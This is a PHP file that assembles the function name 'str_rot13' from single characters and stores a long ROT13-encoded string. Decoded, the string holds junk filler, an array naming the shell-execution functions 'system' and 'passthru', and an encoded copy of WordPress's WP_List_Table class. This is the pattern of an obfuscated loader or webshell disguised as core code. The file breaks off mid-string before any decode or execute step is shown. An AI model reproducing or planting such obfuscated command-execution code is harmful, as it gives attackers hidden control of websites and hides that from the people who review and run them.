<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nqzvavfgengvba NCV: JC_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Yvfg_Gnoyr
 * @fvapr 3.1.0
 */

/**
 * Onfr pynff sbe qvfcynlvat n yvfg bs vgrzf va na nwnkvsvrq UGZY gnoyr.
 *
 * @fvapr 3.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Yvfg_Gnoyr {

	/**
	 * Gur pheerag yvfg bs vgrzf.
	 *
	 * @fvapr 3.1.0
	 * @ine neenl
	 */
	choyvp $vgrzf;

	/**
	 * Inevbhf vasbezngvba nobhg gur pheerag gnoyr.
	 *
	 * @fvapr 3.1.0
	 * @ine neenl
	 */
	cebgrpgrq $_netf;

	/**
	 * Inevbhf vasbezngvba arrqrq sbe qvfcynlvat gur cntvangvba.
	 *
	 * @fvapr 3.1.0
	 * @ine neenl
	 */
	cebgrpgrq $_cntvangvba_netf = neenl();

	/**
	 * Gur pheerag fperra.
	 *
	 * @fvapr 3.1.0
	 * @ine JC_Fperra
	 */
	cebgrpgrq $fperra;

	/**
	 * Pnpurq ohyx npgvbaf.
	 *
	 * @fvapr 3.1.0
	 * @ine neenl
	 */
	cevingr $_npgvbaf;

	/**
	 * Pnpurq cntvangvba bhgchg.
	 *
	 * @fvapr 3.1.0
	 * @ine fgevat
	 */
	cevingr $_cntvangvba;

	/**
	 * Gur ivrj fjvgpure zbqrf.
	 *
	 * @fvapr 4.1.0
	 * @ine neenl
	 */
	cebgrpgrq $zbqrf = neenl();

	/**
	 * Fgberf gur inyhr erghearq ol ::trg_pbyhza_vasb().
	 *
	 * @fvapr 4.1.0
	 * @ine neenl|ahyy
	 */
	cebgrpgrq $_pbyhza_urnqref;

	/**
	 * {@vagreany Zvffvat Fhzznel}
	 *
	 * @ine neenl
	 */
	cebgrpgrq $pbzcng_svryqf = neenl( '_netf', '_cntvangvba_netf', 'fperra', '_npgvbaf', '_cntvangvba' );

	/**
	 * {@vagreany Zvffvat Fhzznel}
	 *
	 * @ine neenl
	 */
	cebgrpgrq $pbzcng_zrgubqf = neenl(
		'frg_cntvangvba_netf',
		'trg_ivrjf',
		'trg_ohyx_npgvbaf',
		'ohyx_npgvbaf',
		'ebj_npgvbaf',
		'zbaguf_qebcqbja',
		'ivrj_fjvgpure',
		'pbzzragf_ohooyr',
		'trg_vgrzf_cre_cntr',
		'cntvangvba',
		'trg_fbegnoyr_pbyhzaf',
		'trg_pbyhza_vasb',
		'trg_gnoyr_pynffrf',
		'qvfcynl_gnoyrani',
		'rkgen_gnoyrani',
		'fvatyr_ebj_pbyhzaf',
	);

	/**
	 * Pbafgehpgbe.
	 *
	 * Gur puvyq pynff fubhyq pnyy guvf pbafgehpgbe sebz vgf bja pbafgehpgbe gb bireevqr
	 * gur qrsnhyg $netf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz neenl|fgevat $netf {
	 *     Neenl be fgevat bs nethzragf.
	 *
	 *     @glcr fgevat $cyheny   Cyheny inyhr hfrq sbe ynoryf naq gur bowrpgf orvat yvfgrq.
	 *                            Guvf nssrpgf guvatf fhpu nf PFF pynff-anzrf naq abaprf hfrq
	 *                            va gur yvfg gnoyr, r.t. 'cbfgf'. Qrsnhyg rzcgl.
	 *     @glcr fgevat $fvathyne Fvathyne ynory sbe na bowrpg orvat yvfgrq, r.t. 'cbfg'.
	 *                            Qrsnhyg rzcgl
	 *     @glcr obby   $nwnk     Jurgure gur yvfg gnoyr fhccbegf Nwnk. Guvf vapyhqrf ybnqvat
	 *                            naq fbegvat qngn, sbe rknzcyr. Vs gehr, gur pynff jvyy pnyy
	 *                            gur _wf_inef() zrgubq va gur sbbgre gb cebivqr inevnoyrf
	 *                            gb nal fpevcgf unaqyvat Nwnk riragf. Qrsnhyg snyfr.
	 *     @glcr fgevat $fperra   Fgevat pbagnvavat gur ubbx anzr hfrq gb qrgrezvar gur pheerag
	 *                            fperra. Vs yrsg ahyy, gur pheerag fperra jvyy or nhgbzngvpnyyl frg.
	 *                            Qrsnhyg ahyy.
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		$netf = jc_cnefr_netf(
			$netf,
			neenl(
				'cyheny'   => '',
				'fvathyne' => '',
				'nwnk'     => snyfr,
				'fperra'   => ahyy,
			)
		);

		$guvf->fperra = pbaireg_gb_fperra( $netf['fperra'] );

		nqq_svygre( \"znantr_{$guvf->fperra->vq}_pbyhzaf\", neenl( $guvf, 'trg_pbyhzaf' ), 0 );

		vs ( ! $netf['cyheny'] ) {
			$netf['cyheny'] = $guvf->fperra->onfr;
		}

		$netf['cyheny']   = fnavgvmr_xrl( $netf['cyheny'] );
		$netf['fvathyne'] = fnavgvmr_xrl( $netf['fvathyne'] );

		$guvf->_netf = $netf;

		vs ( $netf['nwnk'] ) {
			// jc_radhrhr_fpevcg( 'yvfg-gnoyr' );
			nqq_npgvba( 'nqzva_sbbgre', neenl( $guvf, '_wf_inef' ) );
		}

		vs ( rzcgl( $guvf->zbqrf ) ) {
			$guvf->zbqrf = neenl(
				'yvfg'    => __( 'Pbzcnpg ivrj' ),
				'rkprecg' => __( 'Rkgraqrq ivrj' ),
			);
		}
	}

	/**
	 * Znxrf cevingr cebcregvrf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Trggvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr Cebcregl gb trg.
	 * @erghea zvkrq Cebcregl.
	 */
	choyvp shapgvba __trg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			erghea $guvf->$anzr;
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"Gur cebcregl `{$anzr}` vf abg qrpynerq. Trggvat n qlanzvp cebcregl vf \" .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
		erghea ahyy;
	}

	/**
	 * Znxrf cevingr cebcregvrf frggnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Frggvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr  Cebcregl gb purpx vs frg.
	 * @cnenz zvkrq  $inyhr Cebcregl inyhr.
	 */
	choyvp shapgvba __frg( $anzr, $inyhr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			$guvf->$anzr = $inyhr;
			erghea;
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"Gur cebcregl `{$anzr}` vf abg qrpynerq. Frggvat n qlanzvp cebcregl vf \" .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
	}

	/**
	 * Znxrf cevingr cebcregvrf purpxnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Purpxvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr Cebcregl gb purpx vs frg.
	 * @erghea obby Jurgure gur cebcregl vf n onpx-pbzcng cebcregl naq vg vf frg.
	 */
	choyvp shapgvba __vffrg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			erghea vffrg( $guvf->$anzr );
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"Gur cebcregl `{$anzr}` vf abg qrpynerq. Purpxvat `vffrg()` ba n qlanzvp cebcregl \" .
			'vf qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
		erghea snyfr;
	}

	/**
	 * Znxrf cevingr cebcregvrf ha-frggnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Hafrggvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr Cebcregl gb hafrg.
	 */
	choyvp shapgvba __hafrg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			hafrg( $guvf->$anzr );
			erghea;
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"N cebcregl `{$anzr}` vf abg qrpynerq. Hafrggvat n qlanzvp cebcregl vf \" .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
	}

	/**
	 * Znxrf cevingr/cebgrpgrq zrgubqf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr      Zrgubq gb pnyy.
	 * @cnenz neenl  $nethzragf Nethzragf gb cnff jura pnyyvat.
	 * @erghea zvkrq|obby Erghea inyhr bs gur pnyyonpx, snyfr bgurejvfr.
	 */
	choyvp shapgvba __pnyy( $anzr, $nethzragf ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_zrgubqf, gehr ) ) {
			erghea $guvf->$anzr( ...$nethzragf );
		}
		erghea snyfr;
	}

	/**
	 * Purpxf gur pheerag hfre'f crezvffvbaf
	 *
	 * @fvapr 3.1.0
	 * @nofgenpg
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		qvr( 'shapgvba JC_Yvfg_Gnoyr::nwnk_hfre_pna() zhfg or bireevqqra va n fhopynff.' );
	}

	/**
	 * Cercnerf gur yvfg bs vgrzf sbe qvfcynlvat.
	 *
	 * @hfrf JC_Yvfg_Gnoyr::frg_cntvangvba_netf()
	 *
	 * @fvapr 3.1.0
	 * @nofgenpg
	 */
	choyvp shapgvba cercner_vgrzf() {
		qvr( 'shapgvba JC_Yvfg_Gnoyr::cercner_vgrzf() zhfg or bireevqqra va n fhopynff.' );
	}

	/**
	 * Frgf nyy gur arprffnel cntvangvba nethzragf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz neenl|fgevat $netf Neenl be fgevat bs nethzragf jvgu vasbezngvba nobhg gur cntvangvba.
	 */
	cebgrpgrq shapgvba frg_cntvangvba_netf( $netf ) {
		$netf = jc_cnefr_netf(
			$netf,
			neenl(
				'gbgny_vgrzf' => 0,
				'gbgny_cntrf' => 0,
				'cre_cntr'    => 0,
			)
		);

		vs ( ! $netf['gbgny_cntrf'] && $netf['cre_cntr'] > 0 ) {
			$netf['gbgny_cntrf'] = (vag) prvy( $netf['gbgny_vgrzf'] / $netf['cre_cntr'] );
		}

		// Erqverpg vs cntr ahzore vf vainyvq naq urnqref ner abg nyernql frag.
		vs ( ! urnqref_frag() && ! jc_qbvat_nwnk() && $netf['gbgny_cntrf'] > 0 && $guvf->trg_cntrahz() > $netf['gbgny_cntrf'] ) {
			jc_erqverpg( nqq_dhrel_net( 'cntrq', $netf['gbgny_cntrf'] ) );
			rkvg;
		}

		$guvf->_cntvangvba_netf = $netf;
	}

	/**
	 * Npprff gur cntvangvba netf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $xrl Cntvangvba nethzrag gb ergevrir. Pbzzba inyhrf vapyhqr 'gbgny_vgrzf',
	 *                    'gbgny_cntrf', 'cre_cntr', be 'vasvavgr_fpebyy'.
	 * @erghea vag Ahzore bs vgrzf gung pbeerfcbaq gb gur tvira cntvangvba nethzrag.
	 */
	choyvp shapgvba trg_cntvangvba_net( $xrl ) {
		vs ( 'cntr' === $xrl ) {
			erghea $guvf->trg_cntrahz();
		}

		vs ( vffrg( $guvf->_cntvangvba_netf[ $xrl ] ) ) {
			erghea $guvf->_cntvangvba_netf[ $xrl ];
		}

		erghea 0;
	}

	/**
	 * Qrgrezvarf jurgure gur gnoyr unf vgrzf gb qvfcynl be abg
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby
	 */
	choyvp shapgvba unf_vgrzf() {
		erghea ! rzcgl( $guvf->vgrzf );
	}

	/**
	 * Zrffntr gb or qvfcynlrq jura gurer ner ab vgrzf
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba ab_vgrzf() {
		_r( 'Ab vgrzf sbhaq.' );
	}

	/**
	 * Qvfcynlf gur frnepu obk.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $grkg     Gur 'fhozvg' ohggba ynory.
	 * @cnenz fgevat $vachg_vq VQ nggevohgr inyhr sbe gur frnepu vachg svryq.
	 */
	choyvp shapgvba frnepu_obk( $grkg, $vachg_vq ) {
		vs ( rzcgl( $_ERDHRFG['f'] ) && ! $guvf->unf_vgrzf() ) {
			erghea;
		}

		$vachg_vq = $vachg_vq . '-frnepu-vachg';

		vs ( ! rzcgl( $_ERDHRFG['beqreol'] ) ) {
			vs ( vf_neenl( $_ERDHRFG['beqreol'] ) ) {
				sbernpu ( $_ERDHRFG['beqreol'] nf $xrl => $inyhr ) {
					rpub '<vachg glcr=\"uvqqra\" anzr=\"beqreol[' . rfp_ngge( $xrl ) . ']\" inyhr=\"' . rfp_ngge( $inyhr ) . '\" />';
				}
			} ryfr {
				rpub '<vachg glcr=\"uvqqra\" anzr=\"beqreol\" inyhr=\"' . rfp_ngge( $_ERDHRFG['beqreol'] ) . '\" />';
			}
		}
		vs ( ! rzcgl( $_ERDHRFG['beqre'] ) ) {
			rpub '<vachg glcr=\"uvqqra\" anzr=\"beqre\" inyhr=\"' . rfp_ngge( $_ERDHRFG['beqre'] ) . '\" />';
		}
		vs ( ! rzcgl( $_ERDHRFG['cbfg_zvzr_glcr'] ) ) {
			rpub '<vachg glcr=\"uvqqra\" anzr=\"cbfg_zvzr_glcr\" inyhr=\"' . rfp_ngge( $_ERDHRFG['cbfg_zvzr_glcr'] ) . '\" />';
		}
		vs ( ! rzcgl( $_ERDHRFG['qrgnpurq'] ) ) {
			rpub '<vachg glcr=\"uvqqra\" anzr=\"qrgnpurq\" inyhr=\"' . rfp_ngge( $_ERDHRFG['qrgnpurq'] ) . '\" />';
		}
		?>
<c pynff=\"frnepu-obk\">
	<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"<?cuc rpub rfp_ngge( $vachg_vq ); ?>\"><?cuc rpub $grkg; ?>:</ynory>
	<vachg glcr=\"frnepu\" vq=\"<?cuc rpub rfp_ngge( $vachg_vq ); ?>\" anzr=\"f\" inyhr=\"<?cuc _nqzva_frnepu_dhrel(); ?>\" />
		<?cuc fhozvg_ohggba( $grkg, '', '', snyfr, neenl( 'vq' => 'frnepu-fhozvg' ) ); ?>
</c>
		<?cuc
	}

	/**
	 * Trarengrf ivrjf yvaxf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz neenl $yvax_qngn {
	 *     Na neenl bs yvax qngn.
	 *
	 *     @glcr fgevat $hey     Gur yvax HEY.
	 *     @glcr fgevat $ynory   Gur yvax ynory.
	 *     @glcr obby   $pheerag Bcgvbany. Jurgure guvf vf gur pheeragyl fryrpgrq ivrj.
	 * }
	 * @erghea fgevat[] Na neenl bs yvax znexhc. Xrlf zngpu gur `$yvax_qngn` vachg neenl.
	 */
	cebgrpgrq shapgvba trg_ivrjf_yvaxf( $yvax_qngn = neenl() ) {
		vs ( ! vf_neenl( $yvax_qngn ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					/* genafyngbef: %f: Gur $yvax_qngn nethzrag. */
					__( 'Gur %f nethzrag zhfg or na neenl.' ),
					'<pbqr>$yvax_qngn</pbqr>'
				),
				'6.1.0'
			);

			erghea neenl( '' );
		}

		$ivrjf_yvaxf = neenl();

		sbernpu ( $yvax_qngn nf $ivrj => $yvax ) {
			vs ( rzcgl( $yvax['hey'] ) || ! vf_fgevat( $yvax['hey'] ) || '' === gevz( $yvax['hey'] ) ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					fcevags(
						/* genafyngbef: %1$f: Gur nethzrag anzr. %2$f: Gur ivrj anzr. */
						__( 'Gur %1$f nethzrag zhfg or n aba-rzcgl fgevat sbe %2$f.' ),
						'<pbqr>hey</pbqr>',
						'<pbqr>' . rfp_ugzy( $ivrj ) . '</pbqr>'
					),
					'6.1.0'
				);

				pbagvahr;
			}

			vs ( rzcgl( $yvax['ynory'] ) || ! vf_fgevat( $yvax['ynory'] ) || '' === gevz( $yvax['ynory'] ) ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					fcevags(
						/* genafyngbef: %1$f: Gur nethzrag anzr. %2$f: Gur ivrj anzr. */
						__( 'Gur %1$f nethzrag zhfg or n aba-rzcgl fgevat sbe %2$f.' ),
						'<pbqr>ynory</pbqr>',
						'<pbqr>' . rfp_ugzy( $ivrj ) . '</pbqr>'
					),
					'6.1.0'
				);

				pbagvahr;
			}

			$ivrjf_yvaxf[ $ivrj ] = fcevags(
				'<n uers=\"%f\"%f>%f</n>',
				rfp_hey( $yvax['hey'] ),
				vffrg( $yvax['pheerag'] ) && gehr === $yvax['pheerag'] ? ' pynff=\"pheerag\" nevn-pheerag=\"cntr\"' : '',
				$yvax['ynory']
			);
		}

		erghea $ivrjf_yvaxf;
	}

	/**
	 * Trgf gur yvfg bs ivrjf ninvynoyr ba guvf gnoyr.
	 *
	 * Gur sbezng vf na nffbpvngvir neenl:
	 * - `'vq' => 'yvax'`
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		erghea neenl();
	}

	/**
	 * Qvfcynlf gur yvfg bs ivrjf ninvynoyr ba guvf gnoyr.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba ivrjf() {
		$ivrjf = $guvf->trg_ivrjf();
		/**
		 * Svygref gur yvfg bs ninvynoyr yvfg gnoyr ivrjf.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->fperra->vq`, ersref
		 * gb gur VQ bs gur pheerag fperra.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat[] $ivrjf Na neenl bs ninvynoyr yvfg gnoyr ivrjf.
		 */
		$ivrjf = nccyl_svygref( \"ivrjf_{$guvf->fperra->vq}\", $ivrjf );

		vs ( rzcgl( $ivrjf ) ) {
			erghea;
		}

		$guvf->fperra->eraqre_fperra_ernqre_pbagrag( 'urnqvat_ivrjf' );

		rpub \"<hy pynff='fhofhofho'>\a\";
		sbernpu ( $ivrjf nf $pynff => $ivrj ) {
			$ivrjf[ $pynff ] = \"\g<yv pynff='$pynff'>$ivrj\";
		}
		rpub vzcybqr( \" |</yv>\a\", $ivrjf ) . \"</yv>\a\";
		rpub '</hy>';
	}

	/**
	 * Ergevrirf gur yvfg bs ohyx npgvbaf ninvynoyr sbe guvf gnoyr.
	 *
	 * Gur sbezng vf na nffbpvngvir neenl jurer rnpu ryrzrag ercerfragf rvgure n gbc yriry bcgvba inyhr naq ynory, be
	 * na neenl ercerfragvat na bcgtebhc naq vgf bcgvbaf.
	 *
	 * Sbe n fgnaqneq bcgvba, gur neenl ryrzrag xrl vf gur svryq inyhr naq gur neenl ryrzrag inyhr vf gur svryq ynory.
	 *
	 * Sbe na bcgtebhc, gur neenl ryrzrag xrl vf gur ynory naq gur neenl ryrzrag inyhr vf na nffbpvngvir neenl bs
	 * bcgvbaf nf nobir.
	 *
	 * Rknzcyr:
	 *
	 *     [
	 *         'rqvg'         => 'Rqvg',
	 *         'qryrgr'       => 'Qryrgr',
	 *         'Punatr Fgngr' => [
	 *             'srngher' => 'Srngherq',
	 *             'fnyr'    => 'Ba Fnyr',
	 *         ]
	 *     ]
	 *
	 * @fvapr 3.1.0
	 * @fvapr 5.6.0 N ohyx npgvba pna abj pbagnva na neenl bs bcgvbaf va beqre gb perngr na bcgtebhc.
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		erghea neenl();
	}

	/**
	 * Qvfcynlf gur ohyx npgvbaf qebcqbja.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $juvpu Gur ybpngvba bs gur ohyx npgvbaf: Rvgure 'gbc' be 'obggbz'.
	 *                      Guvf vf qrfvtangrq nf bcgvbany sbe onpxjneq pbzcngvovyvgl.
	 */
	cebgrpgrq shapgvba ohyx_npgvbaf( $juvpu = '' ) {
		vs ( vf_ahyy( $guvf->_npgvbaf ) ) {
			$guvf->_npgvbaf = $guvf->trg_ohyx_npgvbaf();

			/**
			 * Svygref gur vgrzf va gur ohyx npgvbaf zrah bs gur yvfg gnoyr.
			 *
			 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->fperra->vq`, ersref
			 * gb gur VQ bs gur pheerag fperra.
			 *
			 * @fvapr 3.1.0
			 * @fvapr 5.6.0 N ohyx npgvba pna abj pbagnva na neenl bs bcgvbaf va beqre gb perngr na bcgtebhc.
			 *
			 * @cnenz neenl $npgvbaf Na neenl bs gur ninvynoyr ohyx npgvbaf.
			 */
			$guvf->_npgvbaf = nccyl_svygref( \"ohyx_npgvbaf-{$guvf->fperra->vq}\", $guvf->_npgvbaf ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

			$gjb = '';
		} ryfr {
			$gjb = '2';
		}

		vs ( rzcgl( $guvf->_npgvbaf ) ) {
			erghea;
		}

		rpub '<ynory sbe=\"ohyx-npgvba-fryrpgbe-' . rfp_ngge( $juvpu ) . '\" pynff=\"fperra-ernqre-grkg\">' .
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( 'Fryrpg ohyx npgvba' ) .
		'</ynory>';
		rpub '<fryrpg anzr=\"npgvba' . $gjb . '\" vq=\"ohyx-npgvba-fryrpgbe-' . rfp_ngge( $juvpu ) . \"\\">\a\";
		rpub '<bcgvba inyhr=\"-1\">' . __( 'Ohyx npgvbaf' ) . \"</bcgvba>\a\";

		sbernpu ( $guvf->_npgvbaf nf $xrl => $inyhr ) {
			vs ( vf_neenl( $inyhr ) ) {
				rpub \"\g\" . '<bcgtebhc ynory=\"' . rfp_ngge( $xrl ) . '\">' . \"\a\";

				sbernpu ( $inyhr nf $anzr => $gvgyr ) {
					$pynff = ( 'rqvg' === $anzr ) ? ' pynff=\"uvqr-vs-ab-wf\"' : '';

					rpub \"\g\g\" . '<bcgvba inyhr=\"' . rfp_ngge( $anzr ) . '\"' . $pynff . '>' . $gvgyr . \"</bcgvba>\a\";
				}
				rpub \"\g\" . \"</bcgtebhc>\a\";
			} ryfr {
				$pynff = ( 'rqvg' === $xrl ) ? ' pynff=\"uvqr-vs-ab-wf\"' : '';

				rpub \"\g\" . '<bcgvba inyhr=\"' . rfp_ngge( $xrl ) . '\"' . $pynff . '>' . $inyhr . \"</bcgvba>\a\";
			}
		}

		rpub \"</fryrpg>\a\";

		fhozvg_ohggba( __( 'Nccyl' ), 'npgvba', 'ohyx_npgvba', snyfr, neenl( 'vq' => \"qbnpgvba$gjb\" ) );
		rpub \"\a\";
	}

	/**
	 * Trgf gur pheerag npgvba fryrpgrq sebz gur ohyx npgvbaf qebcqbja.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea fgevat|snyfr Gur npgvba anzr. Snyfr vs ab npgvba jnf fryrpgrq.
	 */
	choyvp shapgvba pheerag_npgvba() {
		vs ( vffrg( $_ERDHRFG['svygre_npgvba'] ) && ! rzcgl( $_ERDHRFG['svygre_npgvba'] ) ) {
			erghea snyfr;
		}

		vs ( vffrg( $_ERDHRFG['npgvba'] ) && '-1' !== $_ERDHRFG['npgvba'] ) {
			erghea $_ERDHRFG['npgvba'];
		}

		erghea snyfr;
	}

	/**
	 * Trarengrf gur erdhverq UGZY sbe n yvfg bs ebj npgvba yvaxf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat[] $npgvbaf        Na neenl bs npgvba yvaxf.
	 * @cnenz obby     $nyjnlf_ivfvoyr Jurgure gur npgvbaf fubhyq or nyjnlf ivfvoyr.
	 * @erghea fgevat Gur UGZY sbe gur ebj npgvbaf.
	 */
	cebgrpgrq shapgvba ebj_npgvbaf( $npgvbaf, $nyjnlf_ivfvoyr = snyfr ) {
		$npgvba_pbhag = pbhag( $npgvbaf );

		vs ( ! $npgvba_pbhag ) {
			erghea '';
		}

		$zbqr = trg_hfre_frggvat( 'cbfgf_yvfg_zbqr', 'yvfg' );

		vs ( 'rkprecg' === $zbqr ) {
			$nyjnlf_ivfvoyr = gehr;
		}

		$bhgchg = '<qvi pynff=\"' . ( $nyjnlf_ivfvoyr ? 'ebj-npgvbaf ivfvoyr' : 'ebj-npgvbaf' ) . '\">';

		$v = 0;

		sbernpu ( $npgvbaf nf $npgvba => $yvax ) {
			++$v;

			$frcnengbe = ( $v < $npgvba_pbhag ) ? ' | ' : '';

			$bhgchg .= \"<fcna pynff='$npgvba'>{$yvax}{$frcnengbe}</fcna>\";
		}

		$bhgchg .= '</qvi>';

		$bhgchg .= '<ohggba glcr=\"ohggba\" pynff=\"gbttyr-ebj\"><fcna pynff=\"fperra-ernqre-grkg\">' .
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( 'Fubj zber qrgnvyf' ) .
		'</fcna></ohggba>';

		erghea $bhgchg;
	}

	/**
	 * Qvfcynlf n qebcqbja sbe svygrevat vgrzf va gur yvfg gnoyr ol zbagu.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony jcqo      $jcqo      JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
	 *
	 * @cnenz fgevat $cbfg_glcr Gur cbfg glcr.
	 */
	cebgrpgrq shapgvba zbaguf_qebcqbja( $cbfg_glcr ) {
		tybony $jcqo, $jc_ybpnyr;

		/**
		 * Svygref jurgure gb erzbir gur 'Zbaguf' qebc-qbja sebz gur cbfg yvfg gnoyr.
		 *
		 * @fvapr 4.2.0
		 *
		 * @cnenz obby   $qvfnoyr   Jurgure gb qvfnoyr gur qebc-qbja. Qrsnhyg snyfr.
		 * @cnenz fgevat $cbfg_glcr Gur cbfg glcr.
		 */
		vs ( nccyl_svygref( 'qvfnoyr_zbaguf_qebcqbja', snyfr, $cbfg_glcr ) ) {
			erghea;
		}

		/**
		 * Svygref jurgure gb fubeg-pvephvg cresbezvat gur zbaguf qebcqbja dhrel.
		 *
		 * @fvapr 5.7.0
		 *
		 * @cnenz bowrpg[]|snyfr $zbaguf   'Zbaguf' qebc-qbja erfhygf. Qrsnhyg snyfr.
		 * @cnenz fgevat         $cbfg_glcr Gur cbfg glcr.
		 */
		$zbaguf = nccyl_svygref( 'cer_zbaguf_qebcqbja_dhrel', snyfr, $cbfg_glcr );

		vs ( ! vf_neenl( $zbaguf ) ) {
			$rkgen_purpxf = \"NAQ cbfg_fgnghf != 'nhgb-qensg'\";
			vs ( ! vffrg( $_TRG['cbfg_fgnghf'] ) || 'genfu' !== $_TRG['cbfg_fgnghf'] ) {
				$rkgen_purpxf .= \" NAQ cbfg_fgnghf != 'genfu'\";
			} ryfrvs ( vffrg( $_TRG['cbfg_fgnghf'] ) ) {
				$rkgen_purpxf = $jcqo->cercner( ' NAQ cbfg_fgnghf = %f', $_TRG['cbfg_fgnghf'] );
			}

			$zbaguf = $jcqo->trg_erfhygf(
				$jcqo->cercner(
					\"FRYRPG QVFGVAPG LRNE( cbfg_qngr ) NF lrne, ZBAGU( cbfg_qngr ) NF zbagu
					SEBZ $jcqo->cbfgf
					JURER cbfg_glcr = %f
					$rkgen_purpxf
					BEQRE OL cbfg_qngr QRFP\",
					$cbfg_glcr
				)
			);
		}

		/**
		 * Svygref gur 'Zbaguf' qebc-qbja erfhygf.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz bowrpg[] $zbaguf    Neenl bs gur zbaguf qebc-qbja dhrel erfhygf.
		 * @cnenz fgevat   $cbfg_glcr Gur cbfg glcr.
		 */
		$zbaguf = nccyl_svygref( 'zbaguf_qebcqbja_erfhygf', $zbaguf, $cbfg_glcr );

		$zbagu_pbhag = pbhag( $zbaguf );

		vs ( ! $zbagu_pbhag || ( 1 === $zbagu_pbhag && 0 === (vag) $zbaguf[0]->zbagu ) ) {
			erghea;
		}

		$fryrpgrq_zbagu = vffrg( $_TRG['z'] ) ? (vag) $_TRG['z'] : 0;
		?>
		<ynory sbe=\"svygre-ol-qngr\" pynff=\"fperra-ernqre-grkg\"><?cuc rpub trg_cbfg_glcr_bowrpg( $cbfg_glcr )->ynoryf->svygre_ol_qngr; ?></ynory>
		<fryrpg anzr=\"z\" vq=\"svygre-ol-qngr\">
			<bcgvba<?cuc fryrpgrq( $fryrpgrq_zbagu, 0 ); ?> inyhr=\"0\"><?cuc _r( 'Nyy qngrf' ); ?></bcgvba>
		<?cuc
		sbernpu ( $zbaguf nf $nep_ebj ) {
			vs ( 0 === (vag) $nep_ebj->lrne ) {
				pbagvahr;
			}

			$zbagu = mrebvfr( $nep_ebj->zbagu, 2 );
			$lrne  = $nep_ebj->lrne;

			cevags(
